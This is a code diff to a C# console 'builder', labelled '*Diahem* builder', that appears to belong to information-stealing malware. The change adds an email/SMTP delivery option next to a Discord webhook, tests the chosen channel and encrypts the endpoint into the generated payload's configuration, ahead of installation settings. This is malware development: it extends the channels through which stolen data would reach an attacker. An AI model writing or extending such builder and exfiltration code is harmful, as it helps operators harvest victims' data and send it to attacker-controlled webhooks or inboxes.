@@ -8,17 +8,42 @@ internal class Program
     [STAThread]
     private static void Main()
     {
-        // Settings
-        var token = Cli.GetStringValue("Discord webhook url");
-        // Test connection to Discord webhook url
-        if (!Discord.WebhookIsValid(token))
-            Cli.ShowError("Check the fucking webhook url!");
+        // Delivery Settings
+        Cli.ShowInfo("Choose delivery method:\n  [1] Discord Webhook\n  [2] Email (TempMail / SMTP)\n");
+        var deliveryChoice = Cli.GetStringValue("Select delivery method (1 or 2)");
+        
+        if (deliveryChoice == "2")
+        {
+            Build.ConfigValues["DeliveryType"] = Crypt.EncryptConfig("email");
+            var recipient = Cli.GetStringValue("Recipient email address");
+            if (!Email.IsValidEmail(recipient))
+            {
+                Cli.ShowError("Invalid email address format!");
+            }
+            Cli.ShowInfo("Testing SMTP connection...\n");
+            if (!Email.TestEmail(recipient!))
+            {
+                Cli.ShowError("Failed to send test email. Check your internet connection or email address!");
+            }
+            else
+            {
+                Cli.ShowSuccess("Test email sent successfully!\n");
+            }
+            Build.ConfigValues["EmailRecipient"] = Crypt.EncryptConfig(recipient!);
+            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig("");
+        }
         else
-            Discord.SendMessage(" *Diahem* builder connected successfully!", token);
-        Cli.ShowSuccess("Connected successfully!\n");
-
-        // Encrypt values
-        Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
+        {
+            Build.ConfigValues["DeliveryType"] = Crypt.EncryptConfig("discord");
+            var token = Cli.GetStringValue("Discord webhook url");
+            if (!Discord.WebhookIsValid(token))
+                Cli.ShowError("Check the webhook url!");
+            else
+                Discord.SendMessage(" *Diahem* builder connected successfully!", token);
+            Cli.ShowSuccess("Connected successfully!\n");
+            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token!);
+            Build.ConfigValues["EmailRecipient"] = Crypt.EncryptConfig("");
+        }
         // Debug mode (write all exceptions to file)
         Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?");
         // Installation
